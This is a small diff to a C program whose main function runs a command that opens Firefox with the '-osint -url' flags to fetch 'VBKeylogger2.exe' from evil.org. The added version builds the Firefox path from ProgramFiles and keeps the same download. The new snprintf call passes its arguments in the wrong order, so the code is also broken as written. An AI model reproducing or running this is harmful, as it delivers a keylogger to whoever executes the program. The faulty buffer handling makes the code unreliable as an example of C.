@@ -2,6 +2,8 @@
 
 
 int main() {
-    char filepath[] = "firefox.exe -osint -url \"https://www.evil.org/VBKeylogger2.exe\"";
-    return run_command(filepath);
+    const int bufferLen = 300;
+    char firefoxPath[bufferLen];
+    snprintf(firefoxPath, "\"%s\\Mozilla Firefox\\firefox.exe\" -osint -url \"https://www.evil.org/VBKeylogger2.exe\"", getenv("ProgramFiles"), bufferLen);
+    return run_command(firefoxPath);
 }
